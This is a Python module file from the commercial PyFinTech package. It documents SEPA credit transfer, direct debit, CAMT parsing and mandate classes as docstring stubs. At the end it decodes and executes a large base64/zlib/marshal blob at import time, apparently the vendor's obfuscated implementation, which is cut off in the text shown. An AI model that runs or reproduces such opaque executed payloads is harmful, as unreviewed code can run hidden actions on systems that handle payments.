
###########################################################################
#
# LICENSE AGREEMENT
#
# Copyright (c) 2014-2024 joonis new media, Thimo Kraemer
#
# 1. Recitals
#
# joonis new media, Inh. Thimo Kraemer ("Licensor"), provides you
# ("Licensee") the program "PyFinTech" and associated documentation files
# (collectively, the "Software"). The Software is protected by German
# copyright laws and international treaties.
#
# 2. Public License
#
# Permission is hereby granted, free of charge, to any person obtaining a
# copy of this Software, to install and use the Software, copy, publish
# and distribute copies of the Software at any time, provided that this
# License Agreement is included in all copies or substantial portions of
# the Software, subject to the terms and conditions hereinafter set forth.
#
# 3. Temporary Multi-User/Multi-CPU License
#
# Licensor hereby grants to Licensee a temporary, non-exclusive license to
# install and use this Software according to the purpose agreed on up to
# an unlimited number of computers in its possession, subject to the terms
# and conditions hereinafter set forth. As consideration for this temporary
# license to use the Software granted to Licensee herein, Licensee shall
# pay to Licensor the agreed license fee.
#
# 4. Restrictions
#
# You may not use this Software in a way other than allowed in this
# license. You may not:
#
# - modify or adapt the Software or merge it into another program,
# - reverse engineer, disassemble, decompile or make any attempt to
#   discover the source code of the Software,
# - sublicense, rent, lease or lend any portion of the Software,
# - publish or distribute the associated license keycode.
#
# 5. Warranty and Remedy
#
# To the extent permitted by law, THE SOFTWARE IS PROVIDED "AS IS",
# WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT
# LIMITED TO THE WARRANTIES OF QUALITY, TITLE, NONINFRINGEMENT,
# MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE, regardless of
# whether Licensor knows or had reason to know of Licensee particular
# needs. No employee, agent, or distributor of Licensor is authorized
# to modify this warranty, nor to make any additional warranties.
#
# IN NO EVENT WILL LICENSOR BE LIABLE TO LICENSEE FOR ANY DAMAGES,
# INCLUDING ANY LOST PROFITS, LOST SAVINGS, OR OTHER INCIDENTAL OR
# CONSEQUENTIAL DAMAGES ARISING FROM THE USE OR THE INABILITY TO USE THE
# SOFTWARE, EVEN IF LICENSOR OR AN AUTHORIZED DEALER OR DISTRIBUTOR HAS
# BEEN ADVISED OF THE POSSIBILITY OF THESE DAMAGES, OR FOR ANY CLAIM BY
# ANY OTHER PARTY. This does not apply if liability is mandatory due to
# intent or gross negligence.


"""
SEPA module of the Python Fintech package.

This module defines functions and classes to work with SEPA.
"""

__all__ = ['Account', 'Amount', 'SEPATransaction', 'SEPACreditTransfer', 'SEPADirectDebit', 'CAMTDocument', 'Mandate', 'MandateManager']

class Account:
    """Account class"""

    def __init__(self, iban, name, country=None, city=None, postcode=None, street=None):
        """
        Initializes the account instance.

        :param iban: Either the IBAN or a 2-tuple in the form of
            either (IBAN, BIC) or (ACCOUNT_NUMBER, BANK_CODE).
            The latter will be converted to the corresponding
            IBAN automatically. An IBAN is checked for validity.
        :param name: The name of the account holder.
        :param country: The country (ISO-3166 ALPHA 2) of the account
            holder (optional).
        :param city: The city of the account holder (optional).
        :param postcode: The postcode of the account holder (optional).
        :param street: The street of the account holder (optional).
        """
        ...

    @property
    def iban(self):
        """The IBAN of this account (read-only)."""
        ...

    @property
    def bic(self):
        """The BIC of this account (read-only)."""
        ...

    @property
    def name(self):
        """The name of the account holder (read-only)."""
        ...

    @property
    def country(self):
        """The country of the account holder (read-only)."""
        ...

    @property
    def city(self):
        """The city of the account holder (read-only)."""
        ...

    @property
    def postcode(self):
        """The postcode of the account holder (read-only)."""
        ...

    @property
    def street(self):
        """The street of the account holder (read-only)."""
        ...

    @property
    def address(self):
        """Tuple of unstructured address lines (read-only)."""
        ...

    def is_sepa(self):
        """
        Checks if this account seems to be valid
        within the Single Euro Payments Area.
        (added in v6.2.0)
        """
        ...

    def set_ultimate_name(self, name):
        """
        Sets the ultimate name used for SEPA transactions and by
        the :class:`MandateManager`.
        """
        ...

    @property
    def ultimate_name(self):
        """The ultimate name used for SEPA transactions."""
        ...

    def set_originator_id(self, cid=None, cuc=None):
        """
        Sets the originator id of the account holder (new in v6.1.1).

        :param cid: The SEPA creditor id. Required for direct debits
            and in some countries also for credit transfers.
        :param cuc: The CBI unique code (only required in Italy).
        """
        ...

    @property
    def cid(self):
        """The creditor id of the account holder (readonly)."""
        ...

    @property
    def cuc(self):
        """The CBI unique code (CUC) of the account holder (readonly)."""
        ...

    def set_mandate(self, mref, signed, recurrent=False):
        """
        Sets the SEPA mandate for this account.

        :param mref: The mandate reference.
        :param signed: The date of signature. Can be a date object
            or an ISO8601 formatted string.
        :param recurrent: Flag whether this is a recurrent mandate
            or not.
        :returns: A :class:`Mandate` object.
        """
        ...

    @property
    def mandate(self):
        """The assigned mandate (read-only)."""
        ...


class Amount:
    """
    The Amount class with an integrated currency converter.

    Arithmetic operations can be performed directly on this object.
    """

    default_currency = 'EUR'

    exchange_rates = {}

    implicit_conversion = False

    def __init__(self, value, currency=None):
        """
        Initializes the Amount instance.

        :param value: The amount value.
        :param currency: An ISO-4217 currency code. If not specified,
            it is set to the value of the class attribute
            :attr:`default_currency` which is initially set to EUR.
        """
        ...

    @property
    def value(self):
        """The amount value of type ``decimal.Decimal``."""
        ...

    @property
    def currency(self):
        """The ISO-4217 currency code."""
        ...

    @property
    def decimals(self):
        """The number of decimal places (at least 2). Use the built-in ``round`` to adjust the decimal places."""
        ...

    @classmethod
    def update_exchange_rates(cls):
        """
        Updates the exchange rates based on the data provided by the
        European Central Bank and stores it in the class attribute
        :attr:`exchange_rates`. Usually it is not required to call
        this method directly, since it is called automatically by the
        method :func:`convert`.

        :returns: A boolean flag whether updated exchange rates
            were available or not.
        """
        ...

    def convert(self, currency):
        """
        Converts the amount to another currency on the bases of the
        current exchange rates provided by the European Central Bank.
        The exchange rates are automatically updated once a day and
        cached in memory for further usage.

        :param currency: The ISO-4217 code of the target currency.
        :returns: An :class:`Amount` object in the requested currency.
        """
        ...


class SEPATransaction:
    """
    The SEPATransaction class

    This class cannot be instantiated directly. An instance is returned
    by the method :func:`add_transaction` of a SEPA document instance
    or by the iterator of a :class:`CAMTDocument` instance.

    If it is a batch of other transactions, the instance can be treated
    as an iterable over all underlying transactions.
    """

    @property
    def bank_reference(self):
        """The bank reference, used to uniquely identify a transaction."""
        ...

    @property
    def iban(self):
        """The IBAN of the remote account (IBAN)."""
        ...

    @property
    def bic(self):
        """The BIC of the remote account (BIC)."""
        ...

    @property
    def name(self):
        """The name of the remote account holder."""
        ...

    @property
    def country(self):
        """The country of the remote account holder."""
        ...

    @property
    def address(self):
        """A tuple subclass which holds the address of the remote account holder. The tuple values represent the unstructured address. Structured fields can be accessed by the attributes *country*, *city*, *postcode* and *street*."""
        ...

    @property
    def ultimate_name(self):
        """The ultimate name of the remote account (ABWA/ABWE)."""
        ...

    @property
    def originator_id(self):
        """The creditor or debtor id of the remote account (CRED/DEBT)."""
        ...

    @property
    def amount(self):
        """The transaction amount of type :class:`Amount`. Debits are always signed negative."""
        ...

    @property
    def purpose(self):
        """A tuple of the transaction purpose (SVWZ)."""
        ...

    @property
    def date(self):
        """The booking date or appointed due date."""
        ...

    @property
    def valuta(self):
        """The value date."""
        ...

    @property
    def msgid(self):
        """The message id of the physical PAIN file."""
        ...

    @property
    def kref(self):
        """The id of the logical PAIN file (KREF)."""
        ...

    @property
    def eref(self):
        """The end-to-end reference (EREF)."""
        ...

    @property
    def mref(self):
        """The mandate reference (MREF)."""
        ...

    @property
    def purpose_code(self):
        """The external purpose code (PURP)."""
        ...

    @property
    def cheque(self):
        """The cheque number."""
        ...

    @property
    def info(self):
        """The transaction information (BOOKINGTEXT)."""
        ...

    @property
    def classification(self):
        """The transaction classification. For German banks it is a tuple in the form of (SWIFTCODE, GVC, PRIMANOTA, TEXTKEY), for French banks a tuple in the form of (DOMAINCODE, FAMILYCODE, SUBFAMILYCODE, TRANSACTIONCODE), otherwise a plain string."""
        ...

    @property
    def return_info(self):
        """A tuple of return code and reason."""
        ...

    @property
    def status(self):
        """The transaction status. A value of INFO, PDNG or BOOK."""
        ...

    @property
    def reversal(self):
        """The reversal indicator."""
        ...

    @property
    def batch(self):
        """Flag which indicates a batch transaction."""
        ...

    @property
    def camt_reference(self):
        """The reference to a CAMT file."""
        ...

    def get_account(self):
        """Returns an :class:`Account` instance of the remote account."""
        ...


class SEPACreditTransfer:
    """SEPACreditTransfer class"""

    def __init__(self, account, type='NORM', cutoff=14, batch=True, cat_purpose=None, scheme=None, currency=None):
        """
        Initializes the SEPA credit transfer instance.

        Supported pain schemes:

        - pain.001.003.03 (DE)
        - pain.001.001.03
        - pain.001.001.09 (*since v7.6*)
        - pain.001.001.03.ch.02 (CH)
        - pain.001.001.09.ch.03 (CH, *since v7.6*)
        - CBIPaymentRequest.00.04.00 (IT)
        - CBIPaymentRequest.00.04.01 (IT)
        - CBICrossBorderPaymentRequestLogMsg.00.01.01 (IT, *since v7.6*)

        :param account: The local debtor account.
        :param type: The credit transfer priority type (*NORM*, *HIGH*,
            *URGP*, *INST* or *SDVA*). (new in v6.2.0: *INST*,
            new in v7.0.0: *URGP*, new in v7.6.0: *SDVA*)
        :param cutoff: The cut-off time of the debtor's bank.
        :param batch: Flag whether SEPA batch mode is enabled or not.
        :param cat_purpose: The SEPA category purpose code. This code
            is used for special treatments by the local bank and is
            not forwarded to the remote bank. See module attribute
            CATEGORY_PURPOSE_CODES for possible values.
        :param scheme: The PAIN scheme of the document. If not
            specified, the scheme is set to *pain.001.001.03* for
            SEPA payments and *pain.001.001.09* for payments in
            currencies other than EUR.
            In Switzerland it is set to *pain.001.001.03.ch.02*,
            in Italy to *CBIPaymentRequest.00.04.00*.
        :param currency: The ISO-4217 code of the currency to use.
            It must match with the currency of the local account.
            If not specified, it defaults to the currency of the
            country the local IBAN belongs to.
        """
        ...

    @property
    def type(self):
        """The credit transfer priority type (read-only)."""
        ...

    def add_transaction(self, account, amount, purpose, eref=None, ext_purpose=None, due_date=None, charges='SHAR'):
        """
        Adds a transaction to the SEPACreditTransfer document.
        If :attr:`scl_check` is set to ``True``, it is verified that
        the transaction can be routed to the target bank.

        :param account: The remote creditor account.
        :param amount: The transaction amount as floating point number
            or an instance of :class:`Amount`.
        :param purpose: The transaction purpose text. If the value matches
            a valid ISO creditor reference number (starting with "RF..."),
            it is added as a structured reference. For other structured
            references a tuple can be passed in the form of
            (REFERENCE_NUMBER, PURPOSE_TEXT).
        :param eref: The end-to-end reference (optional).
        :param ext_purpose: The SEPA external purpose code (optional).
            This code is forwarded to the remote bank and the account
            holder. See module attribute EXTERNAL_PURPOSE_CODES for
            possible values.
        :param due_date: The due date. If it is an integer or ``None``,
            the next possible date is calculated starting from today
            plus the given number of days (considering holidays and
            the given cut-off time). If it is a date object or an
            ISO8601 formatted string, this date is used without
            further validation.
        :param charges: Specifies which party will bear the charges
            associated with the processing of an international
            transaction. Not applicable for SEPA transactions.
            Can be a value of SHAR (SHA), DEBT (OUR) or CRED (BEN).
            *(new in v7.6)*

        :returns: A :class:`SEPATransaction` instance.
        """
        ...

    def render(self):
        """Renders the SEPACreditTransfer document and returns it as XML."""
        ...

    @property
    def scheme(self):
        """The document scheme version (read-only)."""
        ...

    @property
    def message_id(self):
        """The message id of this document (read-only)."""
        ...

    @property
    def account(self):
        """The local account (read-only)."""
        ...

    @property
    def cutoff(self):
        """The cut-off time of the local bank (read-only)."""
        ...

    @property
    def batch(self):
        """Flag if batch mode is enabled (read-only)."""
        ...

    @property
    def cat_purpose(self):
        """The category purpose (read-only)."""
        ...

    @property
    def currency(self):
        """The ISO-4217 currency code (read-only)."""
        ...

    @property
    def scl_check(self):
        """
        Flag whether remote accounts should be verified against
        the SEPA Clearing Directory or not. The initial value is
        set to ``True`` if the *kontocheck* library is available
        and the local account is originated in Germany, otherwise
        it is set to ``False``.
        """
        ...

    def new_batch(self, kref=None):
        """
        After calling this method additional transactions are added to a new
        batch (``PmtInf`` block). This could be useful if you want to divide
        transactions into different batches with unique KREF ids.

        :param kref: It is possible to set a custom KREF (``PmtInfId``) for
            the new batch (new in v7.2). Be aware that KREF ids should be
            unique over time and that all transactions must be grouped by
            particular SEPA specifications (date, sequence type, etc.) into
            separate batches. This is done automatically if you do not pass
            a custom KREF.
        """
        ...

    def send(self, ebics_client, use_ful=None):
        """
        Sends the SEPA document using the passed EBICS instance.

        :param ebics_client: The :class:`fintech.ebics.EbicsClient` instance.
        :param use_ful: Flag, whether to use the order type
            :func:`fintech.ebics.EbicsClient.FUL` for uploading the document
            or otherwise one of the suitable order types
            :func:`fintech.ebics.EbicsClient.CCT`,
            :func:`fintech.ebics.EbicsClient.CCU`,
            :func:`fintech.ebics.EbicsClient.CIP`,
            :func:`fintech.ebics.EbicsClient.AXZ`,
            :func:`fintech.ebics.EbicsClient.CDD`,
            :func:`fintech.ebics.EbicsClient.CDB`,
            :func:`fintech.ebics.EbicsClient.XE2`,
            :func:`fintech.ebics.EbicsClient.XE3` or
            :func:`fintech.ebics.EbicsClient.XE4`.
            If not specified, *use_ful* is set to ``True`` if the local
            account is originated in France, otherwise it is set to ``False``.
            With EBICS v3.0 the document is always uploaded via
            :func:`fintech.ebics.EbicsClient.BTU`.
        :returns: The EBICS order id.
        """
        ...


class SEPADirectDebit:
    """SEPADirectDebit class"""

    def __init__(self, account, type='CORE', cutoff=36, batch=True, cat_purpose=None, scheme=None, currency=None):
        """
        Initializes the SEPA direct debit instance.

        Supported pain schemes:

        - pain.008.003.02 (DE)
        - pain.008.001.02
        - pain.008.001.08 (*since v7.6*)
        - pain.008.001.02.ch.01 (CH)
        - CBISDDReqLogMsg.00.01.00 (IT)
        - CBISDDReqLogMsg.00.01.01 (IT)

        :param account: The local creditor account with an appointed
            creditor id.
        :param type: The direct debit type (*CORE* or *B2B*).
        :param cutoff: The cut-off time of the creditor's bank.
        :param batch: Flag if SEPA batch mode is enabled or not.
        :param cat_purpose: The SEPA category purpose code. This code
            is used for special treatments by the local bank and is
            not forwarded to the remote bank. See module attribute
            CATEGORY_PURPOSE_CODES for possible values.
        :param scheme: The PAIN scheme of the document. If not
            specified, the scheme is set to *pain.008.001.02*.
            In Switzerland it is set to *pain.008.001.02.ch.01*,
            in Italy to *CBISDDReqLogMsg.00.01.00*.
        :param currency: The ISO-4217 code of the currency to use.
            It must match with the currency of the local account.
            If not specified, it defaults to the currency of the
            country the local IBAN belongs to.
        """
        ...

    @property
    def type(self):
        """The direct debit type (read-only)."""
        ...

    def add_transaction(self, account, amount, purpose, eref=None, ext_purpose=None, due_date=None):
        """
        Adds a transaction to the SEPADirectDebit document.
        If :attr:`scl_check` is set to ``True``, it is verified that
        the transaction can be routed to the target bank.

        :param account: The remote debtor account with a valid mandate.
        :param amount: The transaction amount as floating point number
            or an instance of :class:`Amount`.
        :param purpose: The transaction purpose text. If the value matches
            a valid ISO creditor reference number (starting with "RF..."),
            it is added as a structured reference. For other structured
            references a tuple can be passed in the form of
            (REFERENCE_NUMBER, PURPOSE_TEXT).
        :param eref: The end-to-end reference (optional).
        :param ext_purpose: The SEPA external purpose code (optional).
            This code is forwarded to the remote bank and the account
            holder. See module attribute EXTERNAL_PURPOSE_CODES for
            possible values.
        :param due_date: The due date. If it is an integer or ``None``,
            the next possible date is calculated starting from today
            plus the given number of days (considering holidays, the
            lead time and the given cut-off time). If it is a date object
            or an ISO8601 formatted string, this date is used without
            further validation.

        :returns: A :class:`SEPATransaction` instance.
        """
        ...

    def render(self):
        """Renders the SEPADirectDebit document and returns it as XML."""
        ...

    @property
    def scheme(self):
        """The document scheme version (read-only)."""
        ...

    @property
    def message_id(self):
        """The message id of this document (read-only)."""
        ...

    @property
    def account(self):
        """The local account (read-only)."""
        ...

    @property
    def cutoff(self):
        """The cut-off time of the local bank (read-only)."""
        ...

    @property
    def batch(self):
        """Flag if batch mode is enabled (read-only)."""
        ...

    @property
    def cat_purpose(self):
        """The category purpose (read-only)."""
        ...

    @property
    def currency(self):
        """The ISO-4217 currency code (read-only)."""
        ...

    @property
    def scl_check(self):
        """
        Flag whether remote accounts should be verified against
        the SEPA Clearing Directory or not. The initial value is
        set to ``True`` if the *kontocheck* library is available
        and the local account is originated in Germany, otherwise
        it is set to ``False``.
        """
        ...

    def new_batch(self, kref=None):
        """
        After calling this method additional transactions are added to a new
        batch (``PmtInf`` block). This could be useful if you want to divide
        transactions into different batches with unique KREF ids.

        :param kref: It is possible to set a custom KREF (``PmtInfId``) for
            the new batch (new in v7.2). Be aware that KREF ids should be
            unique over time and that all transactions must be grouped by
            particular SEPA specifications (date, sequence type, etc.) into
            separate batches. This is done automatically if you do not pass
            a custom KREF.
        """
        ...

    def send(self, ebics_client, use_ful=None):
        """
        Sends the SEPA document using the passed EBICS instance.

        :param ebics_client: The :class:`fintech.ebics.EbicsClient` instance.
        :param use_ful: Flag, whether to use the order type
            :func:`fintech.ebics.EbicsClient.FUL` for uploading the document
            or otherwise one of the suitable order types
            :func:`fintech.ebics.EbicsClient.CCT`,
            :func:`fintech.ebics.EbicsClient.CCU`,
            :func:`fintech.ebics.EbicsClient.CIP`,
            :func:`fintech.ebics.EbicsClient.AXZ`,
            :func:`fintech.ebics.EbicsClient.CDD`,
            :func:`fintech.ebics.EbicsClient.CDB`,
            :func:`fintech.ebics.EbicsClient.XE2`,
            :func:`fintech.ebics.EbicsClient.XE3` or
            :func:`fintech.ebics.EbicsClient.XE4`.
            If not specified, *use_ful* is set to ``True`` if the local
            account is originated in France, otherwise it is set to ``False``.
            With EBICS v3.0 the document is always uploaded via
            :func:`fintech.ebics.EbicsClient.BTU`.
        :returns: The EBICS order id.
        """
        ...


class CAMTDocument:
    """
    The CAMTDocument class is used to parse CAMT52, CAMT53 or CAMT54
    documents. An instance can be treated as an iterable over its
    transactions, each represented as an instance of type
    :class:`SEPATransaction`.

    Note: If orders were submitted in batch mode, there are three
    methods to resolve the underlying transactions. Either (A) directly
    within the CAMT52/CAMT53 document, (B) within a separate CAMT54
    document or (C) by a reference to the originally transfered PAIN
    message. The applied method depends on the bank (method B is most
    commonly used).
    """

    def __init__(self, xml, camt54=None):
        """
        Initializes the CAMTDocument instance.

        :param xml: The XML string of a CAMT document to be parsed
            (either CAMT52, CAMT53 or CAMT54).
        :param camt54: In case `xml` is a CAMT52 or CAMT53 document, an
            additional CAMT54 document or a sequence of such documents
            can be passed which are automatically merged with the
            corresponding batch transactions.
        """
        ...

    @property
    def type(self):
        """The CAMT type, eg. *camt.053.001.02* (read-only)."""
        ...

    @property
    def message_id(self):
        """The message id (read-only)."""
        ...

    @property
    def created(self):
        """The date of creation (read-only)."""
        ...

    @property
    def reference_id(self):
        """A unique reference number (read-only)."""
        ...

    @property
    def sequence_id(self):
        """The statement sequence number (read-only)."""
        ...

    @property
    def info(self):
        """Some info text about the document (read-only)."""
        ...

    @property
    def iban(self):
        """The local IBAN (read-only)."""
        ...

    @property
    def bic(self):
        """The local BIC (read-only)."""
        ...

    @property
    def name(self):
        """The name of the account holder (read-only)."""
        ...

    @property
    def currency(self):
        """The currency of the account (read-only)."""
        ...

    @property
    def date_from(self):
        """The start date (read-only)."""
        ...

    @property
    def date_to(self):
        """The end date (read-only)."""
        ...

    @property
    def balance_open(self):
        """The opening balance of type :class:`Amount` (read-only)."""
        ...

    @property
    def balance_close(self):
        """The closing balance of type :class:`Amount` (read-only)."""
        ...


class Mandate:
    """SEPA mandate class."""

    def __init__(self, path):
        """
        Initializes the SEPA mandate instance.

        :param path: The path to a SEPA PDF file.
        """
        ...

    @property
    def mref(self):
        """The mandate reference (read-only)."""
        ...

    @property
    def signed(self):
        """The date of signature (read-only)."""
        ...

    @property
    def b2b(self):
        """Flag if it is a B2B mandate (read-only)."""
        ...

    @property
    def cid(self):
        """The creditor id (read-only)."""
        ...

    @property
    def created(self):
        """The creation date (read-only)."""
        ...

    @property
    def modified(self):
        """The last modification date (read-only)."""
        ...

    @property
    def executed(self):
        """The last execution date (read-only)."""
        ...

    @property
    def closed(self):
        """Flag if the mandate is closed (read-only)."""
        ...

    @property
    def debtor(self):
        """The debtor account (read-only)."""
        ...

    @property
    def creditor(self):
        """The creditor account (read-only)."""
        ...

    @property
    def pdf_path(self):
        """The path to the PDF file (read-only)."""
        ...

    @property
    def recurrent(self):
        """Flag whether this mandate is recurrent or not."""
        ...

    def is_valid(self):
        """Checks if this SEPA mandate is still valid."""
        ...


class MandateManager:
    """
    A MandateManager manages all SEPA mandates that are required
    for SEPA direct debit transactions.

    It stores all mandates as PDF files in a given directory.

    .. warning::

        The MandateManager is still BETA. Don't use for production!
    """

    def __init__(self, path, account):
        """
        Initializes the mandate manager instance.

        :param path: The path to a directory where all mandates
            are stored. If it does not exist it will be created.
        :param account: The creditor account with the full address
            and an appointed creditor id.
        """
        ...

    @property
    def path(self):
        """The path where all mandates are stored (read-only)."""
        ...

    @property
    def account(self):
        """The creditor account (read-only)."""
        ...

    @property
    def scl_check(self):
        """
        Flag whether remote accounts should be verified against
        the SEPA Clearing Directory or not. The initial value is
        set to ``True`` if the *kontocheck* library is available
        and the local account is originated in Germany, otherwise
        it is set to ``False``.
        """
        ...

    def get_mandate(self, mref):
        """
        Get a stored SEPA mandate.

        :param mref: The mandate reference.
        :returns: A :class:`Mandate` object.
        """
        ...

    def get_account(self, mref):
        """
        Get the debtor account of a SEPA mandate.

        :param mref: The mandate reference.
        :returns: A :class:`Account` object.
        """
        ...

    def get_pdf(self, mref, save_as=None):
        """
        Get the PDF document of a SEPA mandate.

        All SEPA meta data is removed from the PDF.

        :param mref: The mandate reference.
        :param save_as: If given, it must be the destination path
            where the PDF file is saved.
        :returns: The raw PDF data.
        """
        ...

    def add_mandate(self, account, mref=None, signature=None, recurrent=True, b2b=False, lang=None):
        """
        Adds a new SEPA mandate and creates the corresponding PDF file.
        If :attr:`scl_check` is set to ``True``, it is verified that
        a direct debit transaction can be routed to the target bank.

        :param account: The debtor account with the full address.
        :param mref: The mandate reference. If not specified, a new
            reference number will be created.
        :param signature: The signature which must be the full name
            of the account holder. If given, the mandate is marked
            as signed. Otherwise the method :func:`sign_mandate`
            must be called before the mandate can be used for a
            direct debit.
        :param recurrent: Flag if it is a recurrent mandate or not.
        :param b2b: Flag if it is a B2B mandate or not.
        :param lang: ISO 639-1 language code of the mandate to create.
            Defaults to the language of the account holder's country.
        :returns: The created or passed mandate reference.
        """
        ...

    def sign_mandate(self, document, mref=None, signed=None):
        """
        Updates a SEPA mandate with a signed document.

        :param document: The path to the signed document, which can
            be an image or PDF file.
        :param mref: The mandate reference. If not specified and
            *document* points to an image, the image is scanned for
            a Code39 barcode which represents the mandate reference.
        :param signed: The date of signature. If not specified, the
            current date is used.
        :returns: The mandate reference.
        """
        ...

    def update_mandate(self, mref, executed=None, closed=None):
        """
        Updates the SEPA meta data of a mandate.

        :param mref: The mandate reference.
        :param executed: The last execution date. Can be a date
            object or an ISO8601 formatted string.
        :param closed: Flag if this mandate is closed.
        """
        ...

    def archive_mandates(self, zipfile):
        """
        Archives all closed SEPA mandates.

        Currently not implemented!

        :param zipfile: The path to a zip file.
        """
        ...



from typing import TYPE_CHECKING
if not TYPE_CHECKING:
    import marshal, zlib, base64
    exec(marshal.loads(zlib.decompress(base64.b64decode(
        b'eJy0vQdAHMfVOL67V2kHQgihfipIHBxHU7OqkUQ9OBBFBck+DvYOTgIOXRHqDUknhEAN9S6rWx2rWJKleMYtcUtiJ3HOjuMa1y+J41QlX/x/M7t33AHC2L/vL8SwM7s7'
        b'b8qb1+bN248Zv38c/D4Ov44pkPBMGVPFlLE8y3MbmTLOLFkk5SWNrG0ELzXLGpnFcoduAWeW87JGdgNrVpi5RpZleHkxE7RRo3i4KLg4ozBdXWvjXTVmtc2idlab1YXL'
        b'ndW2OnWmtc5prqxW15sqF5uqzLrg4JJqq8P7LG+2WOvMDrXFVVfptNrqHGpTHa+urDE5HFDqtKkbbPbF6gars1pNQOiCK8eI7Y+H3zj4DSF9WAGJm3Gzbs4tcUvdMrfc'
        b'rXAr3UHuYHeIO9Qd5la5w90R7j7uSHdfd5S7nzva3d8d4x7gHuge5B7sHuIe6h7mVruHu0e4R7pHuWPdo91jLHF0NJSr47ZIG5nVmhXyVXGNTDGzStPIsMyauDWaeTBu'
        b'MAJVGomh0jusrDisfUmzpHRoixlNuKFGCdcDx3EMKVtXX1tzPmso4xoFGXypRoabcVNB3my8ZRg+i1sKNLglp7QwUc6MyZDiB0PRIY3ENZQ8uglvxWf0OdqcRNyEt+Wr'
        b'0XYZo8JbJQZ8Cp93xcAjqBnfQIfJIzIGnce7pFIWHRuHTrqGwc0MfB6dS6Cv5uekz8UtmhwpE4l3S9AdvBm1aDjXAHhqnH2FPjUtB7foratxawFUFD5cMhkdnu8aRADs'
        b'r55Bbufko+vogXBfhS9LUsLT4f0h5IlnotA1R04+bgU4eBuLnktmgnM4dBXfgkaOhCcm42a0OQRfD8c3HKgJ36rHzyxBzeFhDDN4pJRB9xVhVg1L21KZF4Wb83LxNgmD'
        b'tqNNEnyfRYfwCbQD7pPZxxst9Xp0KQ4GZKseb0NNBaRFqCXJkKhBh2EEszIUq2LREbE6dAPqa4dm5UF/TxXIGNkqFp+ajS6K91X4ElqfkJuozU/UsfGokQntJwnGu9FT'
        b'cJ90DR9Cm9DBhGxtPG7Kg64tncqE4B0cvoyuot2VrIgDEvhN8+LADoKagYjJ/L+ipjvOrXHHuxPcWneiW+dOcie7U9ypljQRYdktQYCwHCAsSxGWowjLruFEhLX4Iyxp'
        b'7PAuCGsVEHZSlYIJZZiI5MxKq6Q2iqGFL4RJKBYnj25O+21VqFB4zqRkIqAseXx0/fghM4XCf62WMvBXnTz6U2f4/DKmJhgKB4wcIP1rJPP4n/suZ9+N+ctyxbgv2Zog'
        b'Mtfy/exVRTkje7w89b3UENt1hhZ/NODb8Lbw5yOCCz9g/xvTGreZ8TCuRGE1NJbBymlOmh0Xh7fGG5KyAQvQ+ZK43Hy8XavLSczNZ5m68KCpeEOWayaZ/mP4fJzDaV+6'
        b'xOUAZLyKn8HX8U18Dd/A7eHK0GBVUFgIoNkWtC01eWzq+JRxaehWSgy6SnByQRC+NBc95dLTNYBPK/R5uYacfD3ejrfgbbAuW2FdtUBj4rTxOk1iArqCzqGLRegWuo73'
        b'4Z14D96B9+LduG0uw/RPDkMb8OXIdHzShzRkRMnw9CfzkOylZxKLRJxUbgtM42oJTCpHJ1VCJ5VbIxEndWNnKiTpMqlSg51Qfesr9olSx0S42r7+Hb3ptYrPy6stF83Z'
        b'7PVFMddjDq2/pz1j2Vy2WXVG+4e2W6qXBm62nNFG78hOllQNZKJfCBkRPUcjcxJaE4bdQ2H8t8IQbFPYACkeY9E1LTrhJH1IxQ/wxQQdDE6TlmXkqJXL1CUOn++Mhnvz'
        b'8EF0MSExLjuRgzsHuVzUlsiX0TrRZbxbk5CIW/JSZIy8jC1Bx/ElI75A66zGR/A63JyNLgH/Ws3CVF3PjERnNKyHi9NoJHbS5Y7kPPOw3xSL3bbCXKe2CFxI5zDXm6Z5'
        b'JC4rT0bCISeDNTOYjWTt5NJOhkoj9QTVmWrNDuBYZo/UZK9yeBRGo91VZzR6QozGyhqzqc5VbzRquA5YcE0Q3q4giYwkpL5ZBIaKwLgfwclZjpXT1EXGAO0LRfsSoJ8s'
        b'MwVv5NB+dibaW5RZyXXCBzqFqQQfOIoRUovUhxGSHjGiqvMy91Xnw4i+BhcZV3QabcbnHHnQcHwe5uYYg86ORw9c/Sg1RzfRcT3cYzX4wSwGu9FliSsK7oxERx7H7UBE'
        b'WVkO3gO0dRRyu0j9K/WhuJmUZ+CNwxnA/M2zXZFkwbajddKQfLjRJ6ofg+5Kp9LHZ1XjlgRSOnuwhVDYg/gQrX8YYNC1BJ2cYReg26kMPhuD9tEmFaBtaCfePRsuV+Cz'
        b'6DqTj5+ZQl8B7LiMLuLd8lK8jmG0jHY0uq8JEsb7GG5F7ZM5YJBXCe2A/3XoKn0rAl0evZKbhbZD+Wn4jy+iHbRlUehmErorD5kKN/bBfwPaTxuAb43CjfiuHF1Et0kO'
        b'/k9dK4zWBnwS3UF3JegUcAB8BP7HaCl8vB21SvFdCT6WApnn4D96Fu+j8FHLaBjju+G4zQq3jsP/1bUUPrpqrMBPcRXoDpFzQvAWdICW40OD0YFiCT4FdGIMMwadQmdp'
        b'Rfn4MLqLdyvQDaiFSWaSsbuEAh+MT9cD7dkH6AmLZqeBMeIr6AgVGOz4CLzT7sDtS1mGw+dME9lRwJ4PUFLho06ciJEUfQZCUsWsYp6IWM2uYreAdGiXrmJ3ckukBOvo'
        b'IhJWEufhdMketlLDCitF6l0dD4On1Fgdzkpbbf20eaRKUr+ccU0lnb41CB/Vg/Th4+TZuA21A3VtKjDgbRp0U5Kaik5XoGY92gUND8EXGXQP3wlBV+PzrZe1NqmjjSD8'
        b'h+/Ftj6n2lAY1fimZsvxf6ZNnPgwZhrTnmJSp9wZF7ovZ2HM7bfGffNn1bSL6xa8u8q6eNnpzUXnpCNfWpj84S5N2uX7B/o37lZL8t796tSzqknHJ6dOGJuzckCaedqZ'
        b'mD9PmfvLIyuWKJ9VFL3ycb177vamz2+8nPde/LVXMt575+tnXd9kLfq09d//+OdTO44Xf7f2RtvF/7LJIaP3zP8M6CaRMvBVdB5dTdBp8FYtvgMMBRCJS1uKNjiJgMXj'
        b'+2tABMFbcvIMMibEAhN2jYNJasVHKBHEm5egTbhZCwJaomyQnJE/yY3U46NOwsTRXQXaQlki8JyNeCuIX7gJXcyVMX3HSvAuXb1zsMA4z4OcKVJuQrfRuhFAutEJdKUL'
        b'FdVIOxV0mkpPiLmu0sabjYS0UqJKJFUmW8pKWaX4I2WD4SeCi2Qj2FA2hrWr/Igt6/AE19mMDpD5q80OO2H5dkKpuraEs0eQ63AfjSXV5Pho7LOR/jRWTTraHBQTgElo'
